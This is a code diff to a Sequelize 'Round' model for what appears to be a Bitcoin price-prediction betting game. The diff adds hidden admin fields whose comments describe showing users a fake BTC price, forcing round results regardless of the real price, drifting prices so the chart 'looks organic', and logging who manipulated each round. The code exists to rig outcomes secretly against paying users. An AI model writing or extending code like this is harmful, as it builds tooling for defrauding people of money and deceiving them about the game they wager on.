@@ -1,3 +1,4 @@
+
 const { DataTypes } = require('sequelize');
 const { sequelize } = require('../config/database');
 
@@ -77,7 +78,56 @@ const Round = sequelize.define('Round', {
     type: DataTypes.BOOLEAN,
     defaultValue: false,
     comment: 'Whether winners have been paid'
+  },
+
+  // ============================================================
+  // ✅ ADMIN MANIPULATION FIELDS
+  // These are never exposed to users
+  // Only admin endpoints read/write these fields
+  // ============================================================
+
+  adminPriceOverride: {
+    type: DataTypes.DECIMAL(12, 2),
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Fake price admin sets — users see this instead of real BTC price'
+  },
+  adminPriceEnabled: {
+    type: DataTypes.BOOLEAN,
+    defaultValue: false,
+    comment: 'Is admin price override currently active?'
+  },
+  adminForcedResult: {
+    type: DataTypes.ENUM('up', 'down'),
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Admin forced result — overrides real price comparison at round end'
+  },
+  adminPriceDrift: {
+    type: DataTypes.DECIMAL(12, 2),
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Target price to drift toward naturally so chart looks organic'
+  },
+  adminNote: {
+    type: DataTypes.STRING(500),
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Admin internal note for why this round was manipulated'
+  },
+  manipulatedAt: {
+    type: DataTypes.DATE,
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Timestamp of when admin last changed manipulation settings'
+  },
+  manipulatedBy: {
+    type: DataTypes.UUID,
+    allowNull: true,
+    defaultValue: null,
+    comment: 'Admin user ID who activated manipulation on this round'
   }
+
 }, {
   timestamps: true,
   tableName: 'rounds',
